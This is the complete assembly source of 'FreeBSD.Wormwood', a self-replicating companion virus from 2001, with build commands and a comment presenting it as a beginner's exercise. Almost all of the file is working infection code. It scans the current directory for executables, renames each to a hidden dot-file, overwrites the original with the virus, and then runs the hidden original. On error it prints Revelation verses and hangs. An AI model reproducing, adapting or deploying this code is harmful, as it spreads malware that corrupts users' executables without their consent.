#
#                             [FreeBSD.Wormwood]
#
# Simple FreeBSD virus. Written as a test of a posibility of writing FreeBSD
# virus on a pure assembly. Infection way is a companion method - creation of
# the spawned hiden file, which is running after all viral actions complete.
# Very easy to understand and well good as a first step to the FreeBSD assembly
# coding.
#
# To compile:
# -----------
# as -o wormwood.o wormwood.s
# ld -s -o wormwood wormwood.o
#
# 31/08/01

.include		"syscall.inc"
.include		"freebsd.inc"
.include		"dirent.inc"

VIRUS_SIZE		= 1200	# Hardcoded size, check it before run!!!

			.text
			.globl _start
###############################################################################
#                                  Virus                                      #
###############################################################################
_start:
_VirusStart:
# Save the 1st command line argument (argv[0]) offset
# (it is the name of the currently runned file)
			movl	4(%esp), %eax		# argv[0]
			movl	%eax, _OurNameOffset

# Open current directory for read only
                        pushl   $O_RDONLY
                        pushl   $_Directory
                        movl    $SYS_open, %eax
                        pushl   %eax
                        int	$0x80

                        jnc	1f
			addl    $12, %esp		# If an error
			jmp	_ExitVirus		# Go out 
1:
			addl	$12, %esp
                        xchgl   %eax, %ebx

# Read directory structure
_ReadInfoBlock:
                        pushl	$S_BLKSIZE
			movl    $_InfoBlock, %ecx
                        pushl   %ecx
                        pushl   %ebx
                        movl    $SYS_getdents, %eax
                        pushl   %eax
                        int	$0x80
                        addl    $16, %esp

                        orl	%eax, %eax
                        jz	_ExitVirus              # if there's no filez
1:
			call	_ProcessFile		# Call infection

			movzwl	d_reclen(%ecx), %edx
			addl	%edx, %ecx

			movl	%ecx, %edx
			subl	$_InfoBlock, %edx

			cmpl	%eax, %edx
			jl	1b 
			jmp     _ReadInfoBlock

###############################################################################
#                            INFECTION PROCEDURE                              #
###############################################################################
_ProcessFile:		
			pushal

# Do some checks for loyality
			testw	$DT_REG, d_type(%ecx)	# is it a regular file?	
			jz	_EndFile

			cmpb	$0x2e, d_name(%ecx)	# check for DOT at the
			je	_EndFile		# name beggining
			
# Did we find ourself?
			pushl	%ecx
			popl	%ebx

			movl	_OurNameOffset, %edi
			cmpw	$0x2f2e, (%edi)		# skip "./" at start
			jne	1f
			incl	%edi
			incl	%edi
1:
			leal	d_name(%ecx), %esi
			pushl	%edi
			xorl	%eax, %eax
			repne
			scasb
			popl	%ecx
			xchgl	%ecx, %edi
			subl	%edi, %ecx
			rep
			cmpsb
			je	_EndFile

			xchgl	%ebx, %ecx

# Can we execute the file?
			pushl	$X_OK			# check for execute
			leal	d_name(%ecx), %eax	# permissions
			pushl	%eax
			movl	$SYS_access, %eax
			pushl	%eax
			int	$0x80
			addl	$12, %esp

			orl	%eax, %eax
			jnz	_EndFile

# Create the companion name (put the DOT before the name)
			movb	$'.', d_namlen(%ecx)	# the same offset as
							# d_name - 1

# Check the presention of the companion file
			pushl	$F_OK
			leal	d_namlen(%ecx), %eax	# same as d_name - 1
			pushl	%eax
			movl	$SYS_access, %eax
			pushl	%eax
			int	$0x80
			addl	$12, %esp

			orl	%eax, %eax		# file is presented
			jz	_EndFile		# means "infected"

# Open ourself
			pushl	$O_RDONLY
			pushl	_OurNameOffset
			movl	$SYS_open, %eax
			pushl	%eax
			int	$0x80

			jnc	1f
			addl	$12, %esp
			jmp	_EndFile
1:
			addl	$12, %esp
			xchgl	%eax, %ebx

# Read ourself to the buffer
			pushl	$VIRUS_SIZE
			pushl	$_Buffer
			pushl	%ebx
			movl	$SYS_read, %eax
			pushl	%eax
			int	$0x80
			addl	$16, %esp

# Close ourself
			pushl	%ebx
			movl	$SYS_close, %eax
			pushl	%eax
			int	$0x80
			addl	$8, %esp

# Rename founded file to the companion
			leal	d_namlen(%ecx), %eax
			pushl	%eax
			leal	d_name(%ecx), %eax
			pushl	%eax
			movl	$SYS_rename, %eax
			pushl	%eax
			int	$0x80
			addl	$12, %esp

			orl	%eax, %eax
			jnz	_EndFile

# Create infected file
			pushl	$S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH
			pushl	$O_WRONLY|O_CREAT|O_EXCL
			leal	d_name(%ecx), %eax
			pushl	%eax
			movl	$SYS_open, %eax
			pushl	%eax
			int	$0x80
			addl	$16, %esp

# Write virus to the victim
			pushl	$VIRUS_SIZE
			pushl	$_Buffer
			pushl	%ebx
			movl	$SYS_write, %eax
			pushl	%eax
			int	$0x80
			addl	$16, %esp

# Close victim
			pushl	%ebx
			movl	$SYS_close, %eax
			pushl	%eax
			int	$0x80
			addl	$8, %esp

_EndFile:		
			popal
			ret

###############################################################################
#                                EXIT VIRUS                                   #
###############################################################################
_ExitVirus:
# Prepare the string with our companion file name in the _Buffer
# (PAY ATTENTION: buffer should be greater then MAXNAMELEN!!!)
			movb	$'.', _Buffer
			movl	_OurNameOffset, %esi
			movl	$_Buffer+1, %edi
			lodsw
			cmpw	$0x2f2e, %ax		# skip "./" at start
			je	_NextSymbol
			stosw
_NextSymbol:		
			lodsb
			orb	%al, %al
			jz	_EndOfTheNameString
			stosb
			jmp	_NextSymbol
_EndOfTheNameString:
			stosb

# Put the address of the name to the Argv[0]
			movl	$_Buffer, %eax
			movl	%eax, 4(%esp)

# Get the Envp[] offset
			movl	%esp, %eax
			pushl	%eax
			popl	%ebx
			addl	$4, %ebx		# %ebx = Argv[]
			movl	(%esp), %ecx
			shll	$2, %ecx
			addl	$8, %ecx		# add Argc and 0
			addl	%ecx, %eax		# %eax = Envp
			
# Execute file
			pushl	%eax			# offset Envp[]
			pushl	%ebx			# offset Argv[]
			pushl	$_Buffer		# offset file name
			movl	$SYS_execve, %eax
			pushl	%eax
			int	$0x80			# we don't clear stack
							# after this syscall
							# because there is
							# an error anyway

# We are still here? This means an error
			pushl	$_RevelationL
			pushl	$_Revelation
			pushl	$STDOUT
			movl	$SYS_write, %eax
			pushl	%eax
			int	$0x80
			
			jmp	.			# endless loop
	
###############################################################################
#                            VIRUS DATA STRUCTURE                             #
###############################################################################
			.data
_Directory:		.asciz  "."
_Name:			.ascii	"[FreeBSD.Wormwood]"
_Revelation:		.ascii	"\n\nREV.8:10 The third angel sounded his trumpet,\n"
			.ascii	"         And a great star, blazing like a torch,\n"
			.ascii	"         Fell from the sky on a third of the rivers\n"
			.ascii	"         And on the springs of water -\n"
			.ascii	"REV.8:11 The name of the star is Wormwood.\n"
			.ascii	"         A third of the waters turned bitter,\n"
			.ascii	"         And many people died from the waters\n"
			.ascii	"         That had become bitter.\n\n"
_RevelationL		=	. - _Revelation

			.bss
_OurNameOffset:		.int	0
_InfoBlock:             .skip   S_BLKSIZE, 0
_Buffer:		.skip	VIRUS_SIZE, 0
